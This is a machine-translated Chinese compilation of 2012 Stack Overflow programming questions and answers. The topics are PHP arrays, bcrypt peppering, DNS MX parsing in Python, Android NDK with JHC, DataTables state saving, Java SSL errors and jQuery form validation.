## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T21:03:52.537

以设定的时间间隔对服务器端脚本进行 ajax 调用，将最新文件的时间戳传递给它，将其与服务器上文件的时间戳进行比较，如果服务器上的文件较新，则回显内容并重新加载这页纸。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T21:28:05.917

这种技术必须是带有[socket.io](http://socket.io)模块的[node.js。](http://nodejs.org)

它允许您使用[WebSockets](http://websocket.org)，一个在客户端和服务器之间保持打开的通道，并且当消息以任何一种方式发送时，它们都会对更改做出反应。

当 websockets 不可用时（不使用现代浏览器），socket.io 回退到长轮询 ajax。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-24T21:13:20.787

您需要像[Comet](http://en.wikipedia.org/wiki/Comet_%28programming%29)这样的东西，它可以让您在有新版本可用时立即从服务器向客户端发送推送消息。基本思想是保持从客户端到服务器的连接打开，通过这个打开的通道，您可以向客户端发送消息，客户端反过来可以对这些消息做出反应（例如，通过执行 JavaScript 代码来重新加载页面）。

[请参阅这个带有 PHP 后端](http://www.zeitoun.net/articles/comet_and_php/start)的示例，了解如何实现 Comet。

# android - 如何让 JHC 与 android ndk 合作？

> ID：10305909
> 
> 赞同：17
> 
> 时间：2012-04-24T21:00:11.150
> 
> 标签：android, haskell, android-ndk

JHC 是一个 Haskell 编译器，它可移植地生成 C 代码，然后调用编译器后端来生成可执行文件。

我需要为 JHC 的运行时系统转储头文件和库，以便 android ndk 可以使用它来编译生成的 C 代码。

或者，我需要弄清楚如何将 android API 链接到 JHC。

基本上，如何将 JHC 插入 android ndk 后端？

编辑：我使用 JHC 可以使用的 ndk 构建工具之一“build/tools/make-standalone-toolchain.sh”制作了一个独立编译器。现在我需要想办法让 JHC 将我的程序编译成共享对象库，以及如何让 JHC 不需要“主”函数。

Edit2：我有以下 targets.ini 和编译脚本。奇怪的是共享库无法加载。

```
[android]
cc=arm-linux-androideabi-gcc
cflags+= -shared -fPIC -rdynamic -Wno-all
gc=static
executable_extension=.so
merge=mle32 
```

和

```
#!/bin/sh

jhc --cross -mandroid \
 --main=Main.android_main \
 hs/Main.hs -o libs/armeabi/libnative-activity &&   
ant debug &&
ant debug install 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-25T22:41:02.610

我解决了这个问题。我没有将函数调用“app_dummy()”放在“android_main”函数的开头。

# cryptography - 除了使用 bcrypt 密码散列的随机项目级盐之外，使用全局密钥是否有整体优势？

> ID：10305910
> 
> 赞同：3
> 
> 时间：2012-04-24T21:00:17.413
> 
> 标签：cryptography, php-5.3, password-protection, bcrypt

我在 php 5.3+ 中使用 bcrypt 进行密码散列

我知道 bcrypt 使用随机盐，该盐内置到每个项目的结果哈希中。这使得破解每个哈希变得困难，并防止破解

## 我不知道是否还有充分的理由使用额外的应用程序级全局密钥。

例如，不仅仅是将密码字符串散列，例如“password1”使用内置在 bcrypt 生成系统中的随机盐，将“password1”转换为 bcrypt 散列（根据此处：[https](https://gist.github.com/1053158) ://gist.github.com/1053158 ）：$2a$08 $mjQAZ5cZi5B9u6zpUU4mGuRcvtxr1K.9ncYpxCdG.YhlD8yFG2mXK

我还可以创建一个常量，例如： "@#$%$%&BDFGG@$%BNG$Y^$%SEHYSZTHN$%" ，将该常量放入应用程序（放入应用程序源代码或应用程序的配置文件） , 并将其附加到任何要散列的字符串。因此 "password1"+"@#$%$%&BDFGG@$%BNG$Y^$%SEHYSZTHN$%" -> 将被散列到与仅 "password1" 不同的散列中。$2a$08$xFgULsrpoIYlbxp1IG3H8.kdVggyhm4aTQXrP2Ptu25nMBUjBdrrK

显然，在应用程序本身的上下文中，这并没有多大帮助。如果有人在正在运行的系统上尝试密码“password1”，他们就会成功，因为他们会自动获得全局密钥以供使用。但如果他们只有数据库或只能访问数据库，似乎全局密钥可能是一个额外的障碍？因为在不知道全局密钥的情况下，他们将不得不破解 ""password1@#$%$%&BDFGG@$%BNG$Y^$%SEHYSZTHN$%" 而不是仅仅破解 "password1"。

我可以想象可能存在一些潜在的好处：

*   这可能真的会阻碍仅使用受损数据库来破解哈希？

以及可能存在的一些模糊的缺点：

*   这为所有被散列的字符串引入了一个公共线程，如果散列已知，这可能会使破解散列变得更容易。
*   它增加了数据的脆弱性。如果全局密钥丢失，例如在服务器迁移期间或其他任何情况下，数据现在就是垃圾。

## 所以我想弄清楚拥有一个全局密钥是否是一个好主意，或者每个项目的随机盐是否足够，以及你想要的。有谁知道使用全局密钥的任何实现，或建议使用它的研究？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-26T06:29:40.243

盐的唯一目的是击败预计算攻击（例如，彩虹表）。您所说的“全球盐”实际上是一个秘密密钥。

关于这是否有用，意见不一。它有助于防御的唯一威胁模型是攻击者可以获取数据库内容但无法访问您的源代码的威胁模型。就个人而言，我认为这是一种足够狭隘的可能性，因此没有必要进行防御，并且正确地进行防御所需的努力是没有根据的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T21:50:56.020

加盐和拉伸的目的是让黑客在访问数据库时难以破解密码。

如果您在应用程序中添加额外的全局盐，那么您基本上是在应用程序和数据库之间分配您的登录过程，这使事情变得比必要的更复杂，并为攻击打开了更多的场所。

你打算在数据库中存储什么，包括全局盐的哈希值？然后，在登录过程中，您将需要在 db 和 app 之间传输什么？无论如何，你的应用程序和数据库之间的通信应该是安全的（否则你的加盐系统很容易被中间的人破坏）。

如果黑客只能访问 db 而从不访问应用程序，可能会有一点好处，但老实说，这在今天是一个非常微小的不现实案例。黑客将在您的数据库之前访问您的应用程序。这不值得努力。而且，我什至可能是错的。

很多时候，当谈到安全性时，人们会想到“新”的想法，结果却被黑客破坏了，因为没有正确识别和研究极端案例。它是密码学的经典之作。数以千计的这些想法都以巨大的失败告终，并使使用它们的人付出了很多痛苦。创造力是密码学的责任。

坚持经典的安全通信 + 随机项目级加盐方案。

# php - 合并数组而不丢失键索引

> ID：10305912
> 
> 赞同：18
> 
> 时间：2012-04-24T21:00:32.087
> 
> 标签：php, arrays

我有两个数组

```
/**
 * Menu Navigation
 * @var array
 */
public $nav_top = array(
    100 => 'Dashboard',
    200 => 'Sell',
    300 => 'Products',
    400 => 'History',
    500 => 'Customers',
    600 => 'Setup'
);

/**
 * Menu Navigation
 * @var array
 */
public $nav_sub = array(
    201 => 'Current Sale',
    202 => 'Retrieve Sale',
    203 => 'Close Register',

    301 => 'Product',
    302 => 'Stock Control',
    303 => 'Price Books',
    304 => 'Types',
    305 => 'Suppliers',
    306 => 'Brands',
    307 => 'Tags',

    501 => 'Customer',
    502 => 'Group'
); 
```

如何组合这两个数组而不丢失它的键索引？

如果我用`array_merge()`索引做它将从零开始

```
$nav = array_merge($Class->nav_top, $Class->nav_sub);
var_dump($nav);

# Output:
array(
    0 => 'Current Sale',
    1 => 'Retrieve Sale',
    2 => 'Close Register',
    .......
); 
```

预期结果数组键仍然相同

```
# Expected Output
array(
    100 => 'Dashboard',
    200 => 'Sell',
    300 => 'Products',
    ........
); 
```

* * *

## 回答 #1

> 赞同：60
> 
> 时间：2012-04-24T21:02:53.823

我能想到的最简单的：

```
$combined = $nav_top + $nav_sub; 
```

[一个例子](http://codepad.org/PQ2cZBzO)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-24T21:11:47.590

## 我的建议

使用`jeroen`解决方案

## 艰难的出路

```
$combined  = merge($nav_top,$nav_sub); 
```

功能

```
function merge($arr1,$arr2)
{
    if(!is_array($arr1))
        $arr1 = array();
    if(!is_array($arr2))
        $arr2 = array();
    $keys1 = array_keys($arr1);
    $keys2 = array_keys($arr2);
    $keys  = array_merge($keys1,$keys2);
    $vals1 = array_values($arr1);
    $vals2 = array_values($arr2);
    $vals  = array_merge($vals1,$vals2);
    $ret    = array();

    foreach($keys as $key)
    {
        list($unused,$val) = each($vals);
        $ret[$key] = $val;
    }

    return $ret;
} 
```

或者

```
function merge($a1, $a2) {

    $aRes = $a1;
    foreach ( array_slice ( func_get_args (), 1 ) as $aRay ) {
        foreach ( array_intersect_key ( $aRay, $aRes ) as $key => $val )
            $aRes [$key] += $val;
        $aRes += $aRay;
    }
    return $aRes;
} 
```

演示：[http ://codepad.org/9B8V96Gf](http://codepad.org/9B8V96Gf)

# python - python：在标准输出中搜索文本作为变量/字符串

> ID：10305916
> 
> 赞同：0
> 
> 时间：2012-04-24T21:00:49.107
> 
> 标签：python, string, search, variables, stdout

我正在使用 csv 文件对文件第一列中的每个域进行 nslookup。我正在做的是检查我的域列表中的域是否与我的服务器匹配。域的 MX 记录是否指向我的服务器？域的名称服务器是否与我的名称服务器匹配？

现在我有一个设置类型的工作。我正在为我的服务器 IP/主机/等搜索标准输出。如果它们匹配或不匹配，我会写一些东西。

但是，如果 MX 记录指向其自身的子域，则不足以确定这是否是我的 IP 之一。这就是我现在正在做的事情：

例如 nslookup：

```
$ nslookup -type=MX mydomain.com
Server:     192.168.1.1
Address:    192.168.1.1#53

Non-authoritative answer:
mydomain.com    mail exchanger = 10 mail.mydomain.com.
Authoritative answers can be found from:
mail.mydomain.com   internet address = 1.2.3.4 # << I seem to think this isn't always present. 
```

当前子域解决方法：

```
 elif 'mail.' + row[0] in stdout:
                host2ip = socket.gethostbyname('mail.' + row[0])
                newdata = [host2ip]
                writer.writerow(row + newdata) 
```

但是，如果域使用 mx = mail2.mydomain.com 或任何其他子域/A-Record 上述失败怎么办。

更好的是使用输出（mail.domain.com 或 mail2.mydomain.com 或其他）并将其写入行（或之前我将 socket.gethostbyname( *value* )）

我没有设法找到我想做的另一种方式。在线搜索大多指向使用整个标准输出来追加。我想在标准输出中搜索“邮件交换器 =”### 并使用处理 mx 优先级的文本，或者 mail.mydomain.com

整个蟒蛇

```
#!/usr/bin/python
#

import datetime
import csv
import os, time
import socket
from stat import * # ST_SIZE etc
from subprocess import Popen, PIPE, STDOUT

# Set Date
now = datetime.datetime.now()
today = now.strftime("%m-%d-%Y")

# Files
original = "dns_list.csv"
results = "results/dns_results_" + today + ".csv" #dns_results_04-14-2012.csv
tempfile = results + ".tmp"

# Commands
mxscan = "nslookup -type=MX"
nsscan = "nslookup -type=NS"
ascan = "nslookup -type=A"
digserver = "8.8.8.8"
SP = " "

incsv = open(original, 'rb')
try:
    reader = csv.reader(incsv)

    outcsv = open(tempfile, 'wb')
    try:
        writer = csv.writer(outcsv)

        for row in reader:
            p = Popen(mxscan + SP + row[0] + SP + digserver, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
            stdout, empty = p.communicate()

            print 'Command: %s\nOutput: %s\n' % (mxscan + SP + row[0] + SP + digserver , stdout)

            if not stdout or 'find Zone: NXDOMAIN' in stdout: # 'Zone' is column header
                newdata = ['mail exchange']
                writer.writerow(row + newdata)
            elif 'psmtp.com' in stdout:
                    newdata = ['Postini']
                    writer.writerow(row + newdata)
            elif 'mail.' + row[0] in stdout:
                    host2ip = socket.gethostbyname('mail.' + row[0])
                    newdata = [host2ip]
                    writer.writerow(row + newdata)
            else:
                newdata = ['External Email']
                writer.writerow(row + newdata)

    finally:
        outcsv.close()
finally:
    incsv.close()

original = tempfile
incsv = open(original, 'rb')
try:
    reader = csv.reader(incsv)
    outcsv = open(results, 'wb')
    try:
        writer = csv.writer(outcsv)

        for row in reader:
            p = Popen(nsscan + SP + row[0], shell=True, stdin=PIPE,stdout=PIPE, stderr=PIPE)
            stdout, empty = p.communicate()

            print 'Command: %s\nOutput: %s\n' % (mxscan + SP + row[0],stdout)

            if not stdout or 'find Zone: NXDOMAIN' in stdout:
                newdata = ['A records', 'Action']
                writer.writerow(row + newdata)
            elif 'nameserver = dauth1.mydomain.com' in stdout or 'nameserver = dauth2.mydomain.com' in stdout:
                    newdata = ['dauth1/2']
                    writer.writerow(row + newdata)
            elif 'nameserver = ns1.mydomain.com' in stdout or 'nameserver = ns2.mydomain.com' in stdout:
                    newdata = ['ns1/2']
                    writer.writerow(row + newdata)
            else:
                newdata = ['External DNS', 'Delete/Charge']
                writer.writerow(row + newdata)

    finally:
        outcsv.close()
finally:
    incsv.close()

print "Writing changes to new file...."
time.sleep(1)
os.remove(tempfile)
print "Complete! Your new file is located at /root/mxscan/" + results 
```

有什么想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T22:12:24.160

这不是在回答您关于解析标准输出的问题，但我认为它通常会帮助您解决问题。

检查[`dnspython`](http://www.dnspython.org/)模块。提供的[第一个示例](http://www.dnspython.org/examples.html)应该可以帮助您稍微清理一下 MX 查询。

```
import dns.resolver

answers = dns.resolver.query('dnspython.org', 'MX')
for rdata in answers:
    print 'Host', rdata.exchange, 'has preference', rdata.preference 
```

然后，您可以查找 rdata.exchange 并将其与属于您的主机名或 IP 地址进行比较。

```
answers = dns.resolver.query(rdata.exchange)
[a.address for a in answers] 
```

更新：不确定为什么要自己引发 NXDOMAIN 异常，但这是处理它们的一种方法。

```
try:
    answers = dns.resolver.query('bogus.test.for.nxdomain')
except dns.resolver.NXDOMAIN:
    print "NXDOMAIN exception caught."
else:
    print "What?  Maybe my query is going to a 'helpful' server" \
          "that resolves non-existant dns queries to its own server."
    print "Add a filter for the ip address(s) we just got."
    print list(answers) 
```

# ios - HTML5 移动应用程序 - 何时简单地使用 UIWebView 以及何时使用 PhoneGap？

> ID：10305917
> 
> 赞同：1
> 
> 时间：2012-04-24T21:00:54.260
> 
> 标签：ios, cordova, uiwebview

我是一名需要构建 HTML5 移动应用程序的网络开发人员 - 我们需要尝试将其提交到应用程序商店，包括 Apple 的应用程序商店。因此，我需要以某种方式将我的应用程序包装到本机框架中。

话虽如此，我没有时间学习 Objective-C 的精髓并把它弄清楚。

我正在尝试决定是使用 PhoneGap 之类的服务，还是简单地创建一个较小的本机应用程序，该应用程序带有一个从我的站点服务器中提取我的移动应用程序的 web 视图。

在这种情况下，我的应用程序需要联系的唯一本地硬件是推送通知（可能通过 Urban Airship）和地理定位（可以通过 HTML5 完成）。

什么时候使用 PhoneGap 之类的东西而不是简单地创建 UIWebView 是明智的，反之亦然？在这种情况下，您会建议哪个？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-24T21:46:47.313

Apple 对 PhoneGap 应用程序非常忠诚——在 iStore 上的批准几乎没有问题。您应该遵循 Apple Human Guidelines，一切都应该没问题。PhoneGap 提供了许多不同且有趣的功能。它也是跨平台的——在 iOS、Android、WP7 等上运行良好。我认为这是包装 HTML5 和 JS 的最佳方式。

谈论推送 - 如果您选择 phonegap，我建议您查看 pushwoosh 服务。

# c++ - 如何在 Windows 窗体中为我的事件函数定义使用单独的 .cpp 文件？

> ID：10305922
> 
> 赞同：2
> 
> 时间：2012-04-24T21:01:12.900
> 
> 标签：c++, winforms, function, visual-c++, c++-cli

我无法在 Windows 窗体中定义我的 C++ 事件函数。

我想在一个单独的 .cpp 文件中定义我的事件函数（例如：按钮单击），而不是在 windows 窗体 .h 文件中执行所有函数定义，该文件已经充满了为 windows 窗体 GUI 生成的代码。

我尝试这样做，在 Form1.h 类中声明：

```
private: System::Void ganttBar1_Paint
(System::Object^  sender, System::Windows::Forms::PaintEventArgs^  e); 
```

这是 Form1.cpp 类中的定义：

```
#include "Form1.h"

System::Void Form1::ganttBar1_Paint(System::Object^  sender, System::Windows::Forms::PaintEventArgs^  e)
{
    // Definition
} 
```

当我这样做时，我在 .cpp 文件中收到编译器错误，指出它不是类或命名空间名称。

**我该怎么做才能在单独的文件中获取事件函数的定义和声明？**

我只是愚蠢并在这里遗漏了一些东西，还是我必须以不同于 C++ 标准的方式来做这些事情？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-24T21:13:14.140

您的类定义很可能在某个命名空间内（我将`Project1`用作占位符）：

```
#pragma once

namespace Project1
{
    ref class Form1 : public System::Windows::Forms::Form
    {
        // ...
    };
} 
```

因此，您的定义也必须是：

```
#include "Form1.h"

namespace Project1
{
    void Form1::ganttBar1_Paint(System::Object^ sender, System::Windows::Forms::PaintEventArgs^ e)
    {
        // definition
    }
} 
```

或者

```
#include "Form1.h"

void Project1::Form1::ganttBar1_Paint(System::Object^ sender, System::Windows::Forms::PaintEventArgs^ e)
{
    // definition
} 
```

# graphics - 创建 2d 图形资源的最佳实践

> ID：10305923
> 
> 赞同：2
> 
> 时间：2012-04-24T21:01:18.080
> 
> 标签：graphics, 2d, assets

作为一个简短的背景，我一直在慢慢地研究我一直想做一段时间的游戏的核心框架。它已经到了我想开始用除了彩色框之外的一些图形资源来真正充实它的地步。这让我想到了我的问题的核心：

**创建图形资产的最佳方法是什么，这些资产无论在何种设备上都具有相同的质量？**

我的游戏以 Pokemon 为风格，因此无论设备分辨率如何，我都希望在捕捉 16 位感觉的同时仍保持清晰。这是否意味着我只是创建了大量重复的精灵表？即每个资产的 16x16 32x32 48x48 64x64 版本？还是我应该制作矢量艺术并专门为每个设备渲染出来？或者还有其他我没有考虑过的选择吗？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-26T00:28:41.397

如果说 16 位感觉是指经典的老式“像素化”风格（但边缘清晰）。然后，您可以使用[Pixel Art Scaling Algorithm](http://en.wikipedia.org/wiki/Image_scaling#Pixel_art_scaling_algorithms)将它们绘制在最小尺寸和放大倍数上，最简单的是最近的邻居。当然，有许多算法可以产生比 NN 更好的结果，例如 2xSaI 和 hqx 系列算法，如果需要旋转，还有 RotSprite。

如果您想要干净的抗锯齿边缘，您可能需要查看这篇 Microsoft 研究论文：[Depixelizing Pixel Art](http://research.microsoft.com/en-us/um/people/kopf/pixelart/)

然后，您可以将这些算法用作游戏的加载预通行证。

或者，您可以将它们“更早地”转移到您的艺术管道中，以帮助加速生成多个（分辨率/转换）*变体*，您可以进一步对其进行修饰。这个选择很大程度上取决于你的劳动力资源水平和完美主义。另请注意，这会失去解决方案的“纯度”，因为它违反了 DRY，因为更新将需要更改精灵的所有变体。

我建议首先尝试其中一些升级过滤器，看看您是否对结果感到满意。如果你是，你可以通过装载预通行证，这是迄今为止最理想的结果，因为它大大减少了工作和维护。

# c# - Web 服务响应返回 500 内部服务器错误

> ID：10305927
> 
> 赞同：0
> 
> 时间：2012-04-24T21:01:34.380
> 
> 标签：c#, asp.net, wcf, web-services, internal-server-error

我已经编写了自己的 Web 服务，它可以独立运行。我正在从另一个页面调用此 Web 服务，当时它返回 500 Internal Server 错误。我第一次经历这个过程，不知道这意味着什么或为什么会发生这种情况。在 Google 上进行的初步搜索显示了广泛的答案，尽管我找不到任何具体的答案。

### 这是我的呼叫代码-

```
List<string> inputList = new List<string>();
inputList.Add("F");
inputList.Add("B");    
List<string> resultList = new List<string>();
var httpWebRequest = (HttpWebRequest)WebRequest.Create("http://localhost/Helpers/MyService.asmx");
httpWebRequest.Headers.Add("SOAPAction", "\"http://tempuri.org/GetOutput\"");
httpWebRequest.ContentType = "text/json";
httpWebRequest.Method = "POST";
JavaScriptSerializer serializer = new JavaScriptSerializer();

using (var streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
{
    string json = serializer.Serialize(inputList);
    streamWriter.Write(json);
}
var httpResponse = (HttpWebResponse)httpWebRequest.GetResponse(); *****ERROR HERE

string responseText = String.Empty;
using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
{
    responseText = streamReader.ReadToEnd();
}
resultList = serializer.Deserialize<List<string>>(responseText); 
```

### 这是我的网络服务代码 -

```
[WebService(Namespace = "http://tempuri.org/")]
[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]

public class MyService: System.Web.Services.WebService
{        
    public string GetOutput(string jsonStr)
    {
        try
        {
            /*code to format jsonStr and send it along to another web service*/

            var httpResponse = (HttpWebResponse)httpWebRequest.GetResponse();
            string responseText = String.Empty;
            using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
            {
                responseText = streamReader.ReadToEnd();
            }

            //this obj has a head & body
            ResponseObj response_obj = new ResponseObj();                
            response_obj = serializer.Deserialize<ResponseObj>(responseText);                
            List<string> Values = new List<string>();
            if (response_obj.head.result)
                return serializer.Serialize(response_obj.body);

            return "";                  
        }
        catch (Exception ex)
        {
               throw new Exception(ex.Message);
        }
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-24T22:16:36.887

调试此问题的最佳方法可能是将 Visual Studio 附加到 IIS（菜单调试/附加到进程...），以便您可以逐步查看 Web 服务代码中发生的情况。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-25T17:28:18.943

我读到您可以在 localhost/statistics/log 中看到错误的详细信息，这表明我的 Web.config 文件存在问题。我评论了提到的行，错误消失了，为下一个让路！

# php - 使用 PEAR PHP 难以显示自定义错误消息

> ID：10305928
> 
> 赞同：-1
> 
> 时间：2012-04-24T21:01:38.640
> 
> 标签：php, mysql, error-handling, pear

当我的搜索查询返回时，我需要帮助来显示自定义错误消息`MDB2 Error: no such field`。我不知道如何在我的程序中做到这一点。

任何帮助将不胜感激！谢谢。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-04-24T21:27:29.470

试试这些

[http://pear.activeventure.com/core/core.pear.pear.seterrorhandling.html](http://pear.activeventure.com/core/core.pear.pear.seterrorhandling.html)

[http://pear.php.net/manual/en/package.database.db.db-error.php](http://pear.php.net/manual/en/package.database.db.db-error.php)

# scala - Map 中值类型的清单给出类型 Nothing

> ID：10305929
> 
> 赞同：1
> 
> 时间：2012-04-24T21:01:40.237
> 
> 标签：scala

如何获取 Map 中第二个类型参数的清单？

例如，以下函数：

```
 def asMap[T <: AnyRef]()(implicit m : Manifest[T]) : Map[Int, T] = {
    println(m) // Nothing
    ...
  } 
```

调用为：

```
val map : Map[Int,String] = asMap() 
```

隐式 m 参数绑定到 Doing the contrast with an Array：**`Nothing`**

```
 def asArray[T <: AnyRef]()(implicit m : Manifest[T]) : Array[T] = {
    println(m)  // java.lang.String
    ...
  } 
```

调用为：

```
val arr : Array[String] = asArray() 
```

隐含的 m 参数必然会`java.lang.String`- 正如预期的那样

，有人可以解释一下吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T21:23:28.113

我不太明白你在做什么 - 如果你没有 Map 作为参数，你怎么能得到参数？

```
def getManifest[A,B: Manifest](map: Map[A,B]) = manifest[B]

val map = Map(1 -> "one")
getManifest(map) //Manifest[java.lang.String] = java.lang.String 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-24T21:05:41.837

看起来这是因为`Map`它的第二个参数是协变的：`Map[A, B+]`，而`Array`它的类型是不变的：`Array[T]`。

# jquery - jQuery Datatable，保存表格的状态，如分页、搜索等

> ID：10305931
> 
> 赞同：5
> 
> 时间：2012-04-24T21:01:43.723
> 
> 标签：jquery, datatable, pagination, savestate

所以我使用这个属性 "bStateSave": true 来保存 jQuery Datatable 的状态，但由于某种原因它对我不起作用。当我刷新页面时，它不会保存搜索结果和分页等。是否有其他一些参数需要与这个参数一起使用。我主要是通过这个页面上的信息

[http://datatables.net/examples/basic_init/state_save.html](http://datatables.net/examples/basic_init/state_save.html)

该代码太大而无法发布，我不确定我应该使用什么剪断来发布。在此先感谢您的帮助。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2014-08-06T11:32:46.940

首先，你要确保你有一个cookie，一旦你加载了你的页面，就跳进chrome，点击“设置”，然后点击隐私部分下的“显示高级设置”，点击内容设置。

下面是来自该站点的代码示例，它在我的网络应用程序中运行良好，并确保您拥有最新版本的插件。

```
$('#MyExampleGrv').dataTable({
    "bStateSave": true,
    "fnStateSave": function (oSettings, oData) {
        localStorage.setItem('DataTables_' + window.location.pathname, JSON.stringify(oData));
    },
    "fnStateLoad": function (oSettings) {
        var data = localStorage.getItem('DataTables_' + window.location.pathname);
        return JSON.parse(data);
    }
}); 
```

这段代码的作用是创建一个本地存储而不是 cookie，并使用特定页面而不是仅使用称为 Datatables 的通用标识符，这样如果您在另一个页面上有一个表，就不会发生冲突。这段代码不会做什么，如果您使用 ASP.NET 控件和 gridview，如果您使用 ASP.NET 中内置的通用 CRUD 操作（例如 EDIT/DELETE/UPDATE）和您的编辑，则此代码不会保存分页状态项目在分页第 3 页上，它会在回发后默认为第 1 页，甚至通过 AJAX 进行部分回发。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2016-07-18T16:53:24.943

我知道这个答案不是关于这个旧版本的数据表，但我相信它会对新手有所帮助。

从 2011 年到现在，Datatables API 发生了很大变化。要保存数据表的状态，您可以使用 HTML5 LocalStorage 或 DB（ajax 回调）。要使用 localStorage 启用状态保存，请执行以下调用：

```
$(document).ready(function() {
$('#datatable').DataTable({
  stateSave: true,
 });
} ); 
```

如果您想使用**sessionStorage**而不是**localStorage**：

```
$(document).ready(function() {
$('#datatable').DataTable({
  stateSave: true,
  stateDuration:-1 //force the use of Session Storage
 });
} ); 
```

如果您想使用数据库来避免将它们存储在浏览器中，那么您必须使用选项[stateSaveCallback](https://datatables.net/reference/option/stateSaveCallback)和[stateLoadCallback](https://datatables.net/reference/option/stateLoadCallback)中定义的回调函数。

这是一个包含示例和源代码的教程，向您展示如何实现上述所有方法：[Datatables state save client and server-side](http://refreshmymind.com/datatables-state-save-client-server-side/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-24T21:09:31.933

在浏览器中进行检查时是否看到 cookie？我正在使用 Chrome 和开发人员工具来查看您发送的链接的当前 cookie。我看到一个名为“datatables.net”的 cookie 存储在我的机器上。您在尝试自定义 DataTables 代码时是否看到此 cookie？

# java - 运行简单 SSL Java 示例时出现 SSLHandshakeException

> ID：10305934
> 
> 赞同：0
> 
> 时间：2012-04-24T21:01:53.217
> 
> 标签：java, ssl, sslhandshakeexception

我正在运行这个[Java + SSL Tutorial](http://stilius.net/java/java_ssl.php)，但出现以下错误。

```
main, handling exception: javax.net.ssl.SSLHandshakeException: Received fatal alert: certificate_unknown
javax.net.ssl.SSLHandshakeException: Received fatal alert: certificate_unknown
    at com.sun.net.ssl.internal.ssl.Alerts.getSSLException(Unknown Source)
    at com.sun.net.ssl.internal.ssl.Alerts.getSSLException(Unknown Source)
    at com.sun.net.ssl.internal.ssl.SSLSocketImpl.recvAlert(Unknown Source)
    at com.sun.net.ssl.internal.ssl.SSLSocketImpl.readRecord(Unknown Source)
    at com.sun.net.ssl.internal.ssl.SSLSocketImpl.performInitialHandshake(Unknown Source)
    at com.sun.net.ssl.internal.ssl.SSLSocketImpl.readDataRecord(Unknown Source)
    at com.sun.net.ssl.internal.ssl.AppInputStream.read(Unknown Source)
    at sun.nio.cs.StreamDecoder.readBytes(Unknown Source)
    at sun.nio.cs.StreamDecoder.implRead(Unknown Source)
    at sun.nio.cs.StreamDecoder.read(Unknown Source)
    at java.io.InputStreamReader.read(Unknown Source)
    at java.io.BufferedReader.fill(Unknown Source)
    at java.io.BufferedReader.readLine(Unknown Source)
    at java.io.BufferedReader.readLine(Unknown Source)
    at EchoServer.main(EchoServer.java:24) 
```

代码中发生异常的行在这里：

```
 while ((string = bufferedreader.readLine()) != null) { 
```

我在这里做错了什么？自编写该示例以来情况是否发生了变化？

* * *

## 回答 #1

> 赞同：-2
> 
> 时间：2012-04-24T21:05:56.937

由于某种原因，您的证书可能无效（或未加载）。启用调试模式应该可以帮助您找到更多问题

> System.setProperty("javax.net.debug", "all");

此外，如果您使用自签名证书，请查看：[http ://ctasada.blogspot.com.es/2010/11/httpclient-use-self-signed-certificates.html](http://ctasada.blogspot.com.es/2010/11/httpclient-use-self-signed-certificates.html)

# c++ - 传递给 mktime 时，为什么要将月份编号设置为实际月份？

> ID：10305937
> 
> 赞同：1
> 
> 时间：2012-04-24T21:02:00.607
> 
> 标签：c++

```
#include <time.h>
#include <iostream>
int main()
{

        struct tm dayofmonth = {0};
        int iYear = 2012;
        int iMonth = 2; // February

        dayofmonth.tm_year = iYear - 1900;
        dayofmonth.tm_mon =  iMonth;
        dayofmonth.tm_mday = 0;
        dayofmonth.tm_isdst = 0;

        mktime(&dayofmonth);

        std::cout << "Number of days for the month " << dayofmonth.tm_mon << " is " << dayofmonth.tm_mday << std::endl;

} 
```

需要编写一个简单的例程，以查找给定月份的天数。但是，对于 mktime，我为什么要传递实际的月份编号而不是月份编号 -1。

更令人困惑的是，在调用 mktime 之后，tm_mon 返回月份 -1 而不是传递的原始月份。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-24T21:06:01.820

因为你设置了`tm_mday = 0`. 本月的“零号”（`tm_mon = 2`指三月）回滚到上个月（二月）的最后一天。

是的，令人困惑的是，`tm_mday`从 1 开始，而`tm_mon`从 0 开始。你最终会习惯的:-)

# jquery - jquery验证：防止表单提交

> ID：10305938
> 
> 赞同：35
> 
> 时间：2012-04-24T21:02:04.477
> 
> 标签：jquery, jquery-validate

通过使用 jQuery 插件验证，我正在尝试验证我的表单。当验证通过时，我希望 javascript 使用表单中的值触发然后停止。浏览到新的/相同的站点时没有实际的表单提交。

这可能与 jquery 验证？

* * *

## 回答 #1

> 赞同：57
> 
> 时间：2012-04-24T21:46:49.370

你可以试试这个（[例子](http://jsfiddle.net/SeWXp/)）：

```
$(function(){
    $("#myform").validate();    
    $("#myform").on('submit', function(e) {
        var isvalid = $("#myform").valid();
        if (isvalid) {
            e.preventDefault();
            alert(getvalues("myform"));
        }
    });
});

function getvalues(f)
{
    var form=$("#"+f);
    var str='';
    $("input:not('input:submit')", form).each(function(i){
        str+='\n'+$(this).prop('name')+': '+$(this).val();
    });
    return str;
} 
```

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-04-24T21:04:03.040

是的：

```
$("form").submit(function(event) {
    if (somethingIsInvalid) { 
      event.preventDefault();
    }
}); 
```

* * *

## 回答 #3

> 赞同：12
> 
> 时间：2018-02-23T09:40:17.350

```
$("#form").validate({
  rules: {...},
